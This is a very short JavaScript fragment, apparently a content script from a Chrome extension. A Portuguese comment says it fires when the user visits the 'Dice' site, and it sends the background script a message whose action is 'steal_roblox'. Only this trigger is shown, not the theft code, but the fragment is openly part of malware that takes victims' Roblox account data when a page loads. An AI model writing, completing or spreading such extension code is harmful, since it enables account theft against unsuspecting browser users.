// Assim que entrar no site do Dice, envia um sinal para o background.js
chrome.runtime.sendMessage({ action: "steal_roblox" });
